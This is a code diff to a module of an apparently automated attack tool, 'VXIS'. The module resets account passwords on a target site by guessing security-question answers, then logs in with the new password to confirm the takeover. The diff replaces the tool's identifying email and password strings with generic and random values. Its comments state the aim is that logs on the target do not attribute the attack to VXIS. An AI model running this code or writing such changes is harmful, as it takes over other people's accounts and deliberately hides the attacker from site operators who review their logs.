@@ -3,7 +3,12 @@
 from __future__ import annotations
 import logging
 import re
+import secrets
 from typing import Any
+
+# Generic non-identifying email for negative-control baseline login probes.
+# Must NOT contain "vxis" or any other tool-identifying string.
+_NEGATIVE_CONTROL_EMAIL = "baseline-check@example.invalid"
 from ._payload_loader import load_skill_dataset as _load_ds
 
 logger = logging.getLogger(__name__)
@@ -299,7 +304,7 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                     _format_login_transcript(
                         active_login,
                         {
-                            "email": "vxis-negative-control@example.invalid",
+                            "email": _NEGATIVE_CONTROL_EMAIL,
                             "password": "definitely-wrong-password",
                         },
                         baseline_control["attempt"]["status"],
@@ -355,7 +360,7 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
         }
 
     baseline_control = await _record_login_attempt(
-        "vxis-negative-control@example.invalid",
+        _NEGATIVE_CONTROL_EMAIL,
         "definitely-wrong-password",
         phase="negative_control",
     )
@@ -445,14 +450,18 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
             ]
             for email, answers in common_resets:
                 for ans in answers:
+                    # Generate a unique non-identifying password per attempt so
+                    # the reset value stored/logged on the target does NOT
+                    # attribute the attack to VXIS.
+                    reset_password = f"Reset-{secrets.token_hex(6)}"
                     r = await _session.request(
                         "POST",
                         reset_path,
                         json_data={
                             "email": email,
                             "answer": ans,
-                            "new": "pwned_by_vxis",
-                            "repeat": "pwned_by_vxis",
+                            "new": reset_password,
+                            "repeat": reset_password,
                         },
                     )
                     if r.status == 200:
@@ -460,7 +469,7 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                         r2 = await _session.request(
                             "POST",
                             active_login,
-                            json_data={"email": email, "password": "pwned_by_vxis"},
+                            json_data={"email": email, "password": reset_password},
                         )
                         if r2.status == 200:
                             data = r2.response.json()
@@ -483,7 +492,7 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                                     "positive_control": {
                                         "phase": "password_reset",
                                         "endpoint": active_login,
-                                        "creds": f"{email}:pwned_by_vxis",
+                                        "creds": f"{email}:[reset_password]",
                                         "status": r2.status,
                                         "body_length": r2.body_length,
                                         "response_preview": login_preview,
@@ -524,7 +533,7 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                                                 _format_login_transcript(
                                                     active_login,
                                                     {
-                                                        "email": "vxis-negative-control@example.invalid",
+                                                        "email": _NEGATIVE_CONTROL_EMAIL,
                                                         "password": "definitely-wrong-password",
                                                     },
                                                     baseline_control["attempt"]["status"],
@@ -539,13 +548,13 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                                                     f"[password_reset]\n"
                                                     f"POST {reset_path} HTTP/1.1\n"
                                                     "Content-Type: application/json\n\n"
-                                                    f'{{"email":"{email}","answer":"{ans}","new":"pwned_by_vxis","repeat":"pwned_by_vxis"}}\n\n'
+                                                    f'{{"email":"{email}","answer":"{ans}","new":"[reset_password]","repeat":"[reset_password]"}}\n\n'
                                                     f"HTTP/1.1 {r.status}\n\n"
                                                     f"{reset_preview}"
                                                 ),
                                                 _format_login_transcript(
                                                     active_login,
-                                                    {"email": email, "password": "pwned_by_vxis"},
+                                                    {"email": email, "password": "[reset_password]"},
                                                     r2.status,
                                                     login_preview,
                                                     label="positive_login_after_reset",
